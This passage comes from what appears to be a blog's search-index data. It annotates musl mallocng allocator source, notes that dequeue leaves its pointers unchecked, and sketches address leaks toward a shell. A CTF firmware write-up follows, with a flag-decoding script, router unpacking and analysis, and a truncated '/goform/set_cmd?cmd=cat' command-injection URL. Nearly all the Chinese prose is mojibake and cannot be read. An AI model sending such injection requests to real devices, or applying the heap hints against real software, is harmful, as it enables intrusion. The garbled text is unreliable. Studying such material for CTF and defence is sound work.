// in units don't fit in 16 bits.\n        while (size*cnt >= 65536*UNIT)\n            cnt >>= 1;\n    }\n\n    // If we selected a count of 1 above but it's not sufficient to use\n    // mmap, increase to 2. Then it might be; if not it will nest.\n    if (cnt==1 && size*cnt+UNIT <= pagesize/2) cnt = 2;\n\n    // All choices of size*cnt are \"just below\" a power of two, so anything\n    // larger than half the page size should be allocated as whole pages.\n    if (size*cnt+UNIT > pagesize/2) {\n        // check/update bounce counter to start/increase retention\n        // of freed maps, and inhibit use of low-count, odd-size\n        // small mappings and single-slot groups if activated.\n        int nosmall = is_bouncing(sc);\n        account_bounce(sc);\n        step_seq();\n\n        // since the following count reduction opportunities have\n        // an absolute memory usage cost, don't overdo them. count\n        // coarse usage as part of usage.\n        if (!(sc&1) && sc<32) usage += ctx.usage_by_class[sc+1];\n\n        // try to drop to a lower count if the one found above\n        // increases usage by more than 25%. these reduced counts\n        // roughly fill an integral number of pages, just not a\n        // power of two, limiting amount of unusable space.\n        if (4*cnt > usage && !nosmall) {\n            if (0);\n            else if ((sc&3)==1 && size*cnt>8*pagesize) cnt = 2;\n            else if ((sc&3)==2 && size*cnt>4*pagesize) cnt = 3;\n            else if ((sc&3)==0 && size*cnt>8*pagesize) cnt = 3;\n            else if ((sc&3)==0 && size*cnt>2*pagesize) cnt = 5;\n        }\n        size_t needed = size*cnt + UNIT;\n        needed += -needed & (pagesize-1);\n\n        // produce an individually-mmapped allocation if usage is low,\n        // bounce counter hasn't triggered, and either it saves memory\n        // or it avoids eagar slot allocation without wasting too much.\n        if (!nosmall && cnt<=7) {\n            req += IB + UNIT;\n            req += -req & (pagesize-1);\n            if (req<size+UNIT || (req>=4*pagesize && 2*cnt>usage)) {\n                cnt = 1;\n                needed = req;\n            }\n        }\n\n        p = mmap(0, needed, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);\n        if (p==MAP_FAILED) {\n            free_meta(m);\n            return 0;\n        }\n        m->maplen = needed>>12;\n        ctx.mmap_counter++;\n        active_idx = (4096-UNIT)/size-1;\n        if (active_idx > cnt-1) active_idx = cnt-1;\n        if (active_idx < 0) active_idx = 0;\n    } else {\n        int j = size_to_class(UNIT+cnt*size-IB);\n        int idx = alloc_slot(j, UNIT+cnt*size-IB);\n        if (idx < 0) {\n            free_meta(m);\n            return 0;\n        }\n        struct meta *g = ctx.active[j];\n        p = enframe(g, idx, UNIT*size_classes[j]-IB, ctx.mmap_counter);\n        m->maplen = 0;\n        p[-3] = (p[-3]&31) | (6<<5);\n        for (int i=0; i<=cnt; i++)\n            p[UNIT+i*size-4] = 0;\n        active_idx = cnt-1;\n    }\n    ctx.usage_by_class[sc] += cnt;\n    m->avail_mask = (2u<<active_idx)-1;\n    m->freed_mask = (2u<<(cnt-1))-1 - m->avail_mask;\n    m->mem = (void *)p;\n    m->mem->meta = m;\n    m->mem->active_idx = active_idx;\n    m->last_idx = cnt-1;\n    m->freeable = 1;\n    m->sizeclass = sc;\n    return m;\n}\n```\n\né€šè¿‡mmapåˆ†é…Groupï¼Œåˆå§‹åŒ–ç›¸å…³ä¿¡æ¯ã€‚\n\n#### â‘£alloc_meta\n\n```c\n//v1.2.1 /src/malloc/mallocng/malloc.c\n//ç”¨æ¥åˆ†é…metaå¯¹è±¡\nstruct meta *alloc_meta(void)\n{\n\tstruct meta *m;\n\tunsigned char *p;\n    //åˆ¤æ–­ctxæ˜¯å¦å®Œæˆåˆå§‹åŒ–ï¼Œæ²¡å®Œæˆå°±æ•´ä¸€ä¸‹\n\tif (!ctx.init_done) {\n#ifndef PAGESIZE\n\t\tctx.pagesize = get_page_size();\n#endif\n\t\tctx.secret = get_random_secret();\n\t\tctx.init_done = 1;\n\t}\n    \n    //pagesizeçš„è®¾ç½®\n\tsize_t pagesize = PGSZ;\n\tif (pagesize < 4096) pagesize = 4096;\n    \n    //é¦–å…ˆçœ‹èƒ½ä¸èƒ½ä»free_meta_headä¸­è·å¾—metaå¯¹è±¡ï¼Œä¸€èˆ¬æ˜¯å°†ä¸€ä¸ªmeta-groupä¸­çš„\n    //chunkå…¨éƒ¨åˆ†é…å®Œç„¶åå…¨éƒ¨é‡Šæ”¾å®Œå°±ä¼šè‡ªåŠ¨è¿›å…¥meta-groupçš„é‡Šæ”¾é˜¶æ®µï¼ŒæˆåŠŸå°±è¿›å…¥\n    //è¿›å…¥åˆ°ctx.free_meta_headä¸­\n\tif ((m = dequeue_head(&ctx.free_meta_head))) return m;\n    \n    //ctxä¸­å¦‚æœæ²¡æœ‰å¯ç”¨çš„meatå¯¹è±¡\n\tif (!ctx.avail_meta_count) {\n\t\tint need_unprotect = 1;\n        //ctxä¸­æ²¡æœ‰ç©ºé—²çš„meatå¯¹è±¡ä¸”ctx.brkä¸ä¸º-1\n\t\tif (!ctx.avail_meta_area_count && ctx.brk!=-1) {\n            //åˆ†é…ä¸€é¡µå†…å­˜0x1000\n\t\t\tuintptr_t new = ctx.brk + pagesize;\n\t\t\tint need_guard = 0;\n            //å¦‚æœctx.brkä¸º0,ä¸€èˆ¬åœ¨åˆå§‹åŒ–çš„æ—¶å€™\n\t\t\tif (!ctx.brk) {\n\t\t\t\tneed_guard = 1;\n                //è°ƒç”¨brk()è·å–å †åœ°å€\n\t\t\t\tctx.brk = brk(0);\n\t\t\t\t// some ancient kernels returned _ebss\n\t\t\t\t// instead of next page as initial brk.\n\t\t\t\tctx.brk += -ctx.brk & (pagesize-1);\n\t\t\t\tnew = ctx.brk + 2*pagesize;\n\t\t\t}\n            //brk()åˆ†é…heapåˆ°newåœ°å€å¤±è´¥\n\t\t\tif (brk(new) != new) {\n\t\t\t\tctx.brk = -1;\n\t\t\t} \n            //åˆ†é…æˆåŠŸ\n            else {\n                //ä¿æŠ¤é¡µ, åœ¨brkåé¢æ˜ å°„ä¸€ä¸ªä¸å¯ç”¨çš„é¡µ(PROT_NONE),\n                //å¦‚æœå †æº¢å‡ºåˆ°è¿™é‡Œå°±ä¼šå‘é€SIGV\n\t\t\t\tif (need_guard) mmap((void *)ctx.brk, pagesize,\n\t\t\t\t\tPROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0);\n\t\t\t\tctx.brk = new;\n                //æŠŠè¿™ä¸€é¡µå…¨åˆ’åˆ†ä¸ºmetaå¯¹è±¡\n\t\t\t\tctx.avail_meta_areas = (void *)(new - pagesize);\n\t\t\t\tctx.avail_meta_area_count = pagesize>>12;\n\t\t\t\tneed_unprotect = 0;\n\t\t\t}\n\t\t}\n        //å¦‚æœå‰é¢brk()åˆ†é…å¤±è´¥äº†, ç›´æ¥mmapåŒ¿åæ˜ å°„ä¸€ç‰‡PROT_NONEçš„å†…å­˜å†åˆ’åˆ†\n\t\tif (!ctx.avail_meta_area_count) {\n\t\t\tsize_t n = 2UL << ctx.meta_alloc_shift;\n\t\t\tp = mmap(0, n*pagesize, PROT_NONE,\n\t\t\t\tMAP_PRIVATE|MAP_ANON, -1, 0);\n\t\t\tif (p==MAP_FAILED) return 0;\n\t\t\tctx.avail_meta_areas = p + pagesize;\n\t\t\tctx.avail_meta_area_count = (n-1)*(pagesize>>12);\n\t\t\tctx.meta_alloc_shift++;\n\t\t}\n        //å¦‚æœavail_meta_areasä¸4Kå¯¹é½, é‚£ä¹ˆå°±è¯´æ˜è¿™ç‰‡åŒºåŸŸæ˜¯åˆšåˆšç”³è¯·çš„ä¸€é¡µ\n        //æ‰€ä»¥éœ€è¦ä¿®æ”¹å†…å­˜çš„æƒé™,æ›´æ”¹ä¸ºè¯»å†™ä¿æŠ¤çš„\n\t\tp = ctx.avail_meta_areas;\n\t\tif ((uintptr_t)p & (pagesize-1)) need_unprotect = 0;\n\t\tif (need_unprotect)\n\t\t\tif (mprotect(p, pagesize, PROT_READ|PROT_WRITE)\n\t\t\t    && errno != ENOSYS)\n\t\t\t\treturn 0;\n\t\tctx.avail_meta_area_count--;\n\t\tctx.avail_meta_areas = p + 4096;\n\t\tif (ctx.meta_area_tail) {\n\t\t\tctx.meta_area_tail->next = (void *)p;\n\t\t} else {\n\t\t\tctx.meta_area_head = (void *)p;\n\t\t}\n        \n        //åˆå§‹åŒ–ctxçš„ç›¸å…³ä¿¡æ¯\n\t\tctx.meta_area_tail = (void *)p;\n\t\tctx.meta_area_tail->check = ctx.secret;\n\t\tctx.avail_meta_count = ctx.meta_area_tail->nslots\n\t\t\t= (4096-sizeof(struct meta_area))/sizeof *m;\n\t\tctx.avail_meta = ctx.meta_area_tail->slots;\n\t}\n    //ctxçš„å¯ç”¨metaå¯¹è±¡æ•°ç»„ä¸­æœ‰èƒ½ç”¨çš„,ä»ä¸­ç›´æ¥åˆ†é…å‡ºæ¥å³å¯\n\tctx.avail_meta_count--;\n\tm = ctx.avail_meta++;\n\tm->prev = m->next = 0;\n\treturn m;\n}\n```\n\n- æŸ¥çœ‹ctxæ˜¯å¦å®Œæˆåˆå§‹åŒ–ï¼Œæ²¡å®Œæˆå°±åˆå§‹åŒ–ä¸€ä¸‹\n- å¦‚æœctx.free_meta_headé“¾è¡¨ä¸­æœ‰ç©ºé—²çš„meta, é‚£ä¹ˆç›´æ¥ä»è¿™é‡Œåˆ†é…ä¸€ä¸ªmeta\n- å¦‚æœctx.avail_meta_count>0ï¼Œä»£è¡¨æœ€å¼€å§‹åˆ†é…å‡ºæ¥çš„metaå¯¹è±¡è¿˜æ²¡æœ‰è¢«ç”¨å®Œï¼Œç›´æ¥ä»ctx.avail_metaå¯¹è±¡æ•°ç»„ä¸­åˆ†é…ä¸€ä¸ª\n- å¦‚æœctx.avail_meta_count=0ï¼Œåˆ™ä»£è¡¨æœ€å¼€å§‹åˆ†é…çš„metaå¯¹è±¡å·²ç»ç”¨å®Œï¼Œæ²¡æœ‰å¯ç”¨çš„ï¼Œé‚£ä¹ˆå°±è¯´æ˜éœ€è¦å‘OSç”³è¯·å†…å­˜å­˜æ”¾meta\n  - å…ˆé€šè¿‡brkåˆ†é…1é¡µï¼Œå¦‚æœåˆ†é…æˆåŠŸï¼Œåˆ™å°†æ–°çš„å†…å­˜é¡µç›´æ¥åˆ’åˆ†ä¸ºmetaå¯¹è±¡ï¼Œç„¶åä¿®æ”¹ä¹‹åçš„å†…å­˜é¡µçš„æƒé™ã€‚\n  - å¦‚æœbrkå¤±è´¥çš„è¯åˆ™ä¼šé€šè¿‡mmap()åˆ†é…è®¸å¤šé¡µå†…å­˜, ä½†æ˜¯è¿™äº›å†…å­˜éƒ½æ˜¯PROT_NONEçš„, å±äºguard page, å †æº¢å‡ºåˆ°è¿™äº›é¡µé¢ä¼šå¼•å‘SIGV, è€Œmetaä¸ä½¿ç”¨å¼€å¤´ä¸ç»“å°¾çš„ä¸€é¡µ, é˜²æ­¢è¢«æº¢å‡º\n- åˆ†é…æˆåŠŸåè®¾ç½®ctxä¸­çš„meta_area_tail, avail_meta_cntç­‰ä¿¡æ¯, æŠŠæ–°åˆ†é…çš„ä¸€é¡µä½œä¸ºå¾…åˆ’åˆ†çš„metaã€‚\n\n#### â‘¤enframe\n\n```c\n//v1.2.1 /src/malloc/mallocng/meta.h\n//åˆ†é…chunkæ—¶ï¼Œè®¾ç½®groupç”¨çš„å‡½æ•°\nstatic inline void *enframe(struct meta *g, int idx, size_t n, int ctr)\n{\n\tsize_t stride = get_stride(g);\n\tsize_t slack = (stride-IB-n)/UNIT;\n\tunsigned char *p = g->mem->storage + stride*idx;\n\tunsigned char *end = p+stride-IB;\n\t// cycle offset within slot to increase interval to address\n\t// reuse, facilitate trapping double-free.\n\tint off = (p[-3] ? *(uint16_t *)(p-2) + 1 : ctr) & 255;\n\tassert(!p[-4]);\n\tif (off > slack) {\n\t\tsize_t m = slack;\n\t\tm |= m>>1; m |= m>>2; m |= m>>4;\n\t\toff &= m;\n\t\tif (off > slack) off -= slack+1;\n\t\tassert(off <= slack);\n\t}\n\tif (off) {\n\t\t// store offset in unused header at offset zero\n\t\t// if enframing at non-zero offset.\n\t\t*(uint16_t *)(p-2) = off;\n\t\tp[-3] = 7<<5;\n\t\tp += UNIT*off;\n\t\t// for nonzero offset there is no permanent check\n\t\t// byte, so make one.\n\t\tp[-4] = 0;\n\t}\n\t*(uint16_t *)(p-2) = (size_t)(p-g->mem->storage)/UNIT;\n\tp[-3] = idx;\n\tset_size(p, end, n);\n\treturn p;\n}\n```\n\n### (2)free\n\n```c\nvoid free(void *p)\n{\n\tif (!p) return;\n   \t//è·å–ç›¸å…³ä¿¡æ¯\n\tstruct meta *g = get_meta(p);\n\tint idx = get_slot_index(p);\n\tsize_t stride = get_stride(g);\n\tunsigned char *start = g->mem->storage + stride*idx;\n\tunsigned char *end = start + stride - IB;\n\tget_nominal_size(p, end);\n    \n    //è®¡ç®—è¿™ä¸ªchunkå¯¹åº”avail_maskå’Œfreed_maskçš„bitmap\n\tuint32_t self = 1u<<idx, all = (2u<<g->last_idx)-1;\n\t((unsigned char *)p)[-3] = 255;\n\t// invalidate offset to group header, and cycle offset of\n\t// used region within slot if current offset is zero.\n\t*(uint16_t *)((char *)p-2) = 0;\n\n\t// release any whole pages contained in the slot to be freed\n\t// unless it's a single-slot group that will be unmapped.\n\tif (((uintptr_t)(start-1) ^ (uintptr_t)end) >= 2*PGSZ && g->last_idx) {\n\t\tunsigned char *base = start + (-(uintptr_t)start & (PGSZ-1));\n\t\tsize_t len = (end-base) & -PGSZ;\n\t\tif (len) madvise(base, len, MADV_FREE);\n\t}\n\n\t// atomic free without locking if this is neither first or last slot\n    //åœ¨meta->freed_maskä¸­æ ‡è®°ä¸€ä¸‹, è¡¨ç¤ºè¿™ä¸ªchunkå·²ç»è¢«é‡Šæ”¾äº†\n\tfor (;;) {\n\t\tuint32_t freed = g->freed_mask;\n\t\tuint32_t avail = g->avail_mask;\n\t\tuint32_t mask = freed | avail;\n\t\tassert(!(mask&self));//è¦é‡Šæ”¾çš„chunkåº”è¯¥æ—¢ä¸åœ¨freedä¸­, ä¹Ÿä¸åœ¨availä¸­\n        \n/*\n1.å¦‚æœæ»¡è¶³  mask+self==all  , é‚£å°±è¯´æ˜é‡Šæ”¾äº†è¿™ä¸ªchunkä¹‹åè¿™ä¸ªgroup\nä¸­æ‰€æœ‰chunkéƒ½è¢«é‡Šæ”¾,å°±éœ€è¦è°ƒç”¨nontrivial_freeå›æ”¶æ•´ä¸ªmeta-group\nå› æ­¤è¿™ä¸ªmetaéœ€è¦è°ƒç”¨nontrivial_free()å›æ”¶è¿™ä¸ªgroup\n2.å¦‚æœæ»¡è¶³  !freed  ,é‚£ä¹ˆå°±è¯´æ˜è¯¥meta-groupä¸­æ²¡æœ‰è¢«é‡Šæ”¾çš„chunk,æœ‰å¯èƒ½æ˜¯ç¬¬ä¸€æ¬¡ä»è¯¥\næœ‰å¯èƒ½è¿™ä¸ªgroupå…¨éƒ¨è¢«åˆ†é…å‡ºå»äº†, è¿™æ ·groupæ˜¯ä¼šå¼¹å‡ºavtiveé˜Ÿåˆ—çš„, è€Œç°åœ¨é‡Šæ”¾äº†ä¸€ä¸ª\nå…¶ä¸­çš„chunk,æ‰€ä»¥éœ€è¦è°ƒç”¨nontrivial_free()æŠŠè¿™ä¸ªgroupé‡æ–°åŠ å…¥é˜Ÿåˆ—\n*/\n\t\tif (!freed || mask+self==all) break;\n        \n        //çº¿ç¨‹æ–¹é¢çš„ä¸€äº›çŸ¥è¯†ï¼Œè¿˜ä¸æ˜¯å¤ªä¼š\n\t\tif (!MT)\n\t\t\tg->freed_mask = freed+self;\n\t\telse if (a_cas(&g->freed_mask, freed, freed+self)!=freed)\n\t\t\tcontinue;\n\t\treturn;\n\t}\n\n\twrlock();\n\tstruct mapinfo mi = nontrivial_free(g, idx);\n\tunlock();\n\tif (mi.len) munmap(mi.base, mi.len);\n}\n```\n\n- é€šè¿‡`get_meta()`æ‰¾åˆ°chunkå¯¹åº”çš„metaï¼Œé‡ç½®idxä¸offsetï¼Œå°†metaçš„freed_maskä¸­æ ‡è®°ä¸€ä¸‹å°±ç®—é‡Šæ”¾å®Œæ¯•äº†ã€‚\n- æœ‰ä¸€äº›ç‰¹æ®Šæƒ…å†µçš„ï¼Œéœ€è¦è·³å‡ºå¾ªç¯æ¥è°ƒç”¨`nontrivial_free()`å®Œæˆç›¸å…³æ“ä½œ\n\n#### â‘ nontrivial_free()\n\n```c\nstatic struct mapinfo nontrivial_free(struct meta *g, int i)\n{\n\tuint32_t self = 1u<<i;\n\tint sc = g->sizeclass;\n\tuint32_t mask = g->freed_mask | g->avail_mask;\n\n    //å¦‚æœmeta-groupä¸­æ‰€æœ‰chunkè¦ä¹ˆè¢«é‡Šæ”¾è¦ä¹ˆå¯ä½¿ç”¨\n    //å¹¶ä¸”gå¯ä»¥è¢«é‡Šæ”¾(ä¸æ˜¯mmapå‡ºæ¥çš„),é‚£ä¹ˆå°±è¦å›æ”¶æ‰æ•´ä¸ªmeta\n\tif (mask+self == (2u<<g->last_idx)-1 && okay_to_free(g)) {\n\t\t// any multi-slot group is necessarily on an active list\n\t\t// here, but single-slot groups might or might not be.\n\t\tif (g->next) {\n             //æ£€æŸ¥scé‡Šæ”¾åˆæ³•, ä¸æ˜¯mmap(63)çš„\n\t\t\tassert(sc < 48);\n            //å¦‚æœgæ˜¯é˜Ÿåˆ—ä¸­å¼€å¤´çš„meta, é‚£ä¹ˆå¼¹å‡ºé˜Ÿåˆ—å, è¦æ¿€æ´»åä¸€ä¸ª\n\t\t\tint activate_new = (ctx.active[sc]==g);\n\t\t\tdequeue(&ctx.active[sc], g);\n            //æ¿€æ´»åä¸€ä¸ªmetaè¿‡ç¨‹ä¸­éœ€è¦å®Œæˆavail_maskå’Œfree_maskçš„è®¾ç½®\n            //å³free_maskå‘avail_maksè¿›è¡Œè½¬ç§»\n\t\t\tif (activate_new && ctx.active[sc])\n\t\t\t\tactivate_group(ctx.active[sc]);\n\t\t}\n        //ç°åœ¨è¦é‡Šæ”¾è¿™ä¸ªmeta-group,æ”¾å…¥ctx.free_meta_headä¸­\n\t\treturn free_group(g);\n        \n\t} \n    //å¦‚æœmask==0, ä¹Ÿå°±æ˜¯è¿™ä¸ªmeta-groupä¸­æ‰€æœ‰çš„chunkéƒ½è¢«åˆ†é…å‡ºå»äº†\n    else if (!mask) {\n\t\tassert(sc < 48);\n\t\t// might still be active if there were no allocations\n\t\t// after last available slot was taken.\n        //ç°åœ¨è¿™ä¸ªå…¨éƒ¨chunkè¢«åˆ†é…å‡ºå»çš„groupä¸­æœ‰ä¸€ä¸ªchunkè¦è¢«é‡Šæ”¾äº†\n        //å› æ­¤è¿™ä¸ªmeta-groupè¦é‡æ–°å…¥é˜Ÿ\n\t\tif (ctx.active[sc] != g) {\n\t\t\tqueue(&ctx.active[sc], g);\n\t\t}\n\t}\n\ta_or(&g->freed_mask, self);\n\treturn (struct mapinfo){ 0 };\n}\n```\n\n#### â‘¡dequeue\n\n```c\n//v1.2.1 /src/malloc/mallocng/meta.h\n//metaçš„å‡ºé˜Ÿæ“ä½œï¼Œä¸€èˆ¬æ¼æ´ç‚¹å‡ºåœ¨è¿™é‡Œ\nstatic inline void dequeue(struct meta **phead, struct meta *m)\n{\n\tif (m->next != m) {\n\t\tm->prev->next = m->next;\n\t\tm->next->prev = m->prev;\n\t\tif (*phead == m) *phead = m->next;\n\t} else {\n\t\t*phead = 0;\n\t}\n\tm->prev = m->next = 0;\n}\n```\n\næ²¡æœ‰æ£€æµ‹metaä¸­çš„nextå’ŒprevæŒ‡é’ˆæ˜¯å¦åˆæ³•\n\n## ğŸ”ºæ³¨ï¼š\n\nmallocå’Œfreeçš„æ—¶å€™ä¸ä¼šå°†chunkçš„å†…å®¹ç½®ç©ºï¼Œè¿™ä¸ªç»™æˆ‘ä»¬åˆ›é€ äº†UAFçš„ä¸€äº›æ¡ä»¶ï¼ŒåŒæ ·çš„ä¹Ÿæœ‰ç›¸åº”çš„é™æ€å †å†…å­˜\n\n## 4.åˆ©ç”¨æ–¹å¼\n\n### (1)æ³„éœ²åœ°å€\n\né€šå¸¸ä½¿ç”¨é™æ€å †å†…å­˜æ¥è¿›è¡Œæ³„éœ²ï¼Œä½†æ˜¯è¿™é‡Œå°±æ¶‰åŠä¸€ä¸ªé—®é¢˜ï¼Œé™æ€å †å†…å­˜å°±ç®—ç”³è¯·åˆ°äº†ï¼Œä¹Ÿæ²¡æœ‰æŒ‡é’ˆå•Šã€‚æ‰€ä»¥ç°åœ¨çš„é¢˜ç›®å¥½å¤šéƒ½æ˜¯ç”³è¯·ä¸€ä¸ªchunkç»“æ„ä½“ï¼Œæ¯”å¦‚\n\n```c\nstruct strChunk\n{\n\tchar size[8];\n\tchar* data;\n}\nstruct strChunk* myChunk = malloc(xxx); \nmyChunk.data = malloc(xxx);\n```\n\nè¿™æ ·åœ¨åœ¨ä¸€å®šçš„UAFæˆ–è€…æº¢å‡ºæ¡ä»¶ä¸‹ï¼Œå°±å¯ä»¥æ³„éœ²å‡ºdataæŒ‡é’ˆï¼Œè€Œå¦‚æœè¿™ä¸ªdataæŒ‡é’ˆæ°å¥½æ˜¯ä»é™æ€å †å†…å­˜ç”³è¯·å‡ºæ¥çš„ï¼Œé‚£ä¹ˆå°±èƒ½æ³„éœ²libcåœ°å€äº†ã€‚\n\nheapåœ°å€ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä¸€èˆ¬å°±æ˜¯é€šè¿‡æº¢å‡ºæˆ–è€…UAFä¹‹ç±»çš„æ¥æ³„éœ²äº†ã€‚\n\nå¦‚æœæ²¡æœ‰çš„è¯ï¼Œæˆ‘èƒ½æƒ³åˆ°çš„å°±æ˜¯æ— é™ç”³è¯·ï¼Œç›´åˆ°è€—å°½metaçš„ç©ºé—´ï¼Œå½“å®ƒå†å¼€è¾Ÿçš„metaç©ºé—´çš„æ—¶å€™ï¼Œç”±äºæ˜¯mmapåˆ†é…çš„ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ç”³è¯·å‡ºlibcçš„ç©ºé—´\n\n### (2)getshell\n\n#### â‘ secrect\n\nç”±äº\n\n#### â‘¡ä¼ªé€ meta\n","tags":["Musl"],"categories":["PWN","Musl"]},{"title":"2021HWSå›ºä»¶å­¦ä¹ ","url":"/2022/01/17/HWSç¡¬ä»¶å­¦ä¹ /","content":"\n# ä¸€ã€ç»ƒä¹ é¢˜\n\n## 1.SMT32å›ºä»¶\n\n### (1)IDAåˆ†æ\n\n#### â‘ é€‰æ‹©æ¶æ„\n\néœ€è¦åœ¨åŠ è½½ç•Œé¢é€‰æ‹©æ¶æ„ï¼Œå¦‚å›¾é€‰æ‹©ARMå°ç«¯åº\n\n![image-20220119162036357](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191620395.png)\n\n#### â‘¡è®¾ç½®é€‰é¡¹\n\nå¤„ç†å™¨é€‰é¡¹è®¾ç½®å¯¹åº”\n\n![du](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191621446.png)\n\n#### â‘¢é€‰æ‹©å›ºä»¶åŠ è½½åœ°å€\n\nOKä¹‹åï¼Œè¿›å…¥å¡«å†™åŠ è½½åœ°å€çš„ç•Œé¢ï¼Œä¿®æ”¹å¦‚ä¸‹\n\n![image-20220119162333850](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191623892.png)\n\nè¿™ä¸ªå¯¹äºSMT32è¿™ç§ç±»å‹çš„å›ºä»¶æ˜¯ä¸€å®šçš„ï¼Œéœ€è¦è‡ªå·±å»ä¸Šç½‘æŸ¥è¯¢ï¼ŒInput fileçš„loading addresså¯ä»¥è®©æˆ‘ä»¬è¾“å…¥å…¶ä»–å€¼ï¼Œå°±ä½¿å¾—IDAä¸ä»å¤´åŠ è½½ï¼Œè€Œä»æˆ‘ä»¬è¾“å…¥çš„åœ°å€å¼€å§‹åŠ è½½ã€‚\n\n#### â‘£å¯»æ‰¾å‡½æ•°åœ°å€\n\n#### A.æŸ¥æ‰¾ä¸­æ–­å¤„ç†å‡½æ•°\n\nåœ¨æœ€å¼€å¤´åœ°å€+4çš„åœ°æ–¹ä¿å­˜çš„æ˜¯ä¸­æ–­å¤„ç†å‡½æ•°ï¼ŒæŒ‰dè½¬æ¢æ•°æ®åŒå‡»ç‚¹è¿›å»å³å¯\n\n![image-20220119162645572](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191626607.png)\n\n#### B.è¯†åˆ«å‡½æ•°\n\nå‘ç°æ˜¯å¥‡æ•°åœ°å€ï¼Œé‚£ä¹ˆåœ¨å¥‡æ•°åœ°å€-1çš„åœ°æ–¹ï¼ŒæŒ‰cï¼Œå³å¯åˆ†æå‡ºä¸€äº›å‡½æ•°\n\n![image-20220119162843385](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191628430.png)\n\nå…¶ä¸­0x08000100å³ä¸ºä¸­æ–­å¤„ç†å‡½æ•°ï¼Œç›¸å¯¹äºSMT32å›ºä»¶è€Œè¨€ï¼Œè¯¥å‡½æ•°çš„ç¬¬äºŒæ¬¡è·³è½¬åœ°å€ä¸Šçš„é¦–æ¬¡è·³è½¬çš„æœ€åè·³è½¬å†è·³è½¬å³ä¸ºmainå‡½æ•°åœ°å€\n\n![image-20220119163217387](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632420.png)\n\n![image-20220119163231426](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632453.png)\n\n![image-20220119163255655](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191632698.png)\n\n![image-20220119163337683](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633721.png)\n\n![image-20220119163359036](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191633077.png)\n\n### (2)è§£å¯†\n\n![image-20220119163634811](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191636846.png)\n\nåˆ†æä¹‹åï¼Œå³å¯æ‰¾åˆ°å¯¹åº”çš„åŠ å¯†ç®—æ³•ï¼ŒæŒ‰ç…§ä¸Šè¿°é€»è¾‘æ¢å¤å³å¯\n\n```python\na = [   \n        0x7D,0x77,0x40,0x7A,0x66,0x30,0x2A,0x2F,\n        0x28,0x40,0x7E,0x30,0x33,0x34,0x2C,0x2E,\n        0x2B,0x28,0x34,0x30,0x30,0x7C,0x41,0x34,\n        0x28,0x33,0x7E,0x30,0x34,0x33,0x33,0x30,\n        0x7E,0x2F,0x31,0x2A,0x41,0x7F,0x2F,0x28,\n        0x2E,0x64\n    ]\n\nflag = \"\"\nfor i in a:\n    flag += chr((i ^ 0x1E) + 3)\nprint(flag)\n```\n\n\n\n## 2.BlinkBlink_200\n\nå‚è€ƒï¼š[HWS2021å†¬ä»¤è¥é€‰æ‹”èµ› | Clangé±¼å¡˜ (blingblingxuanxuan.github.io)](https://blingblingxuanxuan.github.io/2021/02/03/hws2021-winter/#blinkblink)\n\n### (1)å›ºä»¶è§£åŒ…\n\n```\nbinwalk -Me uImage\n```\n\n### (2)å½“å‰ç›®å½•æœç´¢\n\nè¯¥å‘½ä»¤å¯åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹æœç´¢å¯†ç ï¼Œä¸€èˆ¬è¿™ç§è·¯ç”±å™¨çš„å¯†ç éƒ½æ˜¯ä»/etc/passwdä¸­å–å¾—\n\n```\ngrep -ri \"etc/passwd\"\n```\n\n![image-20220119174406881](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191744973.png)\n\næ’é™¤busyboxå’Œlibcï¼Œé‚£ä¹ˆå…ˆå»goaheadä¸­æ‰¾ï¼Œç›´æ¥æ‹–è¿›IDA32åˆ†æ\n\ngoaheadæ˜¯ä¸€ä¸ªåµŒå…¥å¼çš„WebæœåŠ¡å™¨ï¼šhttps://www.embedthis.com/goahead/\n\n#### â‘ å®šä½å­—ç¬¦ä¸²\n\næœç´¢å­—ç¬¦ä¸²`set_qos_cfg`ï¼Œè¿™ä¸ªå¸¸ç”¨ï¼Œæ‰¾åˆ°å¦‚ä¸‹\n\n![image-20220119175251051](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191752096.png)\n\næ¼æ´å¸¸å¸¸åœ¨`goform`æ¥å£ä¸‹ï¼Œç®€å•æŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°å…¶ä¸­æœ‰ä¸€ä¸ª`set_cmd`çš„å¼•ç”¨\n\n![image-20220119175504033](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191755068.png)\n\nè¿›å…¥å‡½æ•°ï¼Œå‘ç°ä¸€ä¸ªè®¾ç½®å‘½ä»¤çš„å‡½æ•°`bs_SetCmd`\n\n![image-20220119175643376](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191756417.png)\n\n#### â‘¡åˆ†æå‡½æ•°\n\nå‚ç…§ä¸Šé¢çš„å‡½æ•°åç§°ï¼Œç»§ç»­æœç´¢\n\n![image-20220119175815328](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191758415.png)\n\nå‘ç°å®šä½åœ¨libshareä¸­ï¼Œæ‰“å¼€åˆ†æä¸€ä¸‹\n\n![image-20220119180323116](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191803171.png)\n\nå…¶ä¸­off_4F2CCçš„å€¼ä¸º%sï¼Œå³æ ¼å¼åŒ–ä¸ºå­—ç¬¦ä¸²è¾“å‡ºç»™v21ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾å°±æ˜¯ä½¿ç”¨`popen`è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\n\n![image-20220119180607832](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191806862.png)\n\n#### â‘¢URLè®¿é—®\n\n```\n/goform/set_cmd?cmd=cat 